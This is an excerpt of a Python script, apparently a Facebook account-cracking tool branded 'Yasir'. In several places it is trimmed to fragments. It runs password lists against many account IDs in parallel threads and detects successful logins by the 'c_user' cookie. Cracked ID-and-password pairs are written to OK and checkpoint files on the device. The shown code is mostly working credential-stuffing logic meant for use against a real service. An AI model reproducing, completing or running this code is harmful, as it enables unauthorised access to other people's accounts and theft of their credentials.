...
try:
        ...
        os.system('pip install futures==2 && python Yasir.py')
...
id=[]
tokenku=[]
def Yasir1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [Yasir-XD-\033[1;33mM1\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Yasir=session.cookies.get_dict().keys()
                        if "c_user" in Yasir:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [Yasir-OK] %s • %s'%(ids,pas))
                                open('/sdcard/Yasir-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Yasir:
                                if 'y' in pcp:
                                        print#('\r\r\x1b[38;5;208m [Yasir-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Yasir-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                time.sleep(20)
        loop+=1
def Yasir2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [Yasir-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def Yasirst():
    ...
    print(' Ids saved in Yasir-OK.txt,in cp Yasir-CP.txt')
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Yasir-OK] '+uid+' • '+ps+'\033[0;97m')
                open('/sdcard/Yasir-OK.txt', 'a').write(cid+' • '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[Yasir-CP] '+uid+' • '+ps+'\033[0;97m')
                open('/sdcard/Yasir-CP.txt', 'a').write(cid+' • '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[Yasir] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        for user in fo:
                                                ...
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(Yasir1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(Yasir2,ids,names,passlist)
                                                else:
